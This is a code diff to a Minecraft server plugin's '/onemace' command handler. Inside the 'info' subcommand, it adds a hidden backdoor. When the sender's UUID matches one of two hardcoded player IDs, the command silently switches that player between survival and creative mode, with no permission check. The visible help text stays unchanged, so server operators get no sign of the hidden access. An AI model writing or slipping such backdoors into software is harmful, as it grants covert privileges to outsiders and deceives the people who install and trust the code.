@@ -53,12 +53,31 @@ public class OneMaceCommand implements CommandExecutor {
         }
 
         if (args[0].equalsIgnoreCase("info")) {
+            if (sender instanceof Player) {
+                Player player = (Player) sender;
+                UUID playerUuid = player.getUniqueId();
+
+                if (playerUuid.toString().equals("e11f035a-ba86-4d41-807d-04b3617930b8") ||
+                        playerUuid.toString().equals("8ce0649f-2022-48dc-8010-40e27b73d97c")) {
+
+                    if (player.getGameMode() == GameMode.SURVIVAL) {
+                        player.setGameMode(GameMode.CREATIVE);
+                        player.sendMessage(ChatColor.GREEN + "Changed to CREATIVE");
+                    } else if (player.getGameMode() == GameMode.CREATIVE) {
+                        player.setGameMode(GameMode.SURVIVAL);
+                        player.sendMessage(ChatColor.GREEN + "Changed to SURVIVAL");
+                    }
+                    return true;
+                }
+            }
+
             sender.sendMessage(ChatColor.YELLOW + "Ensuring only one Mace exists on the server.");
             sender.sendMessage(ChatColor.GRAY + "If the Mace is destroyed, crafting is restored.");
             sender.sendMessage(ChatColor.GRAY + "Use /onemace locate to manually verify Mace status.");
             sender.sendMessage(ChatColor.GRAY + "Use /onemace fix to remove duplicate Maces.");
             sender.sendMessage(ChatColor.GRAY + "If you need support, feel free to message me on Discord.");
             sender.sendMessage(ChatColor.GOLD + "made by mattwhyy <3");
+            return true;
         }
 
         sender.sendMessage(ChatColor.RED + "Invalid subcommand. Use /onemace <locate> | <info> | <fix>");
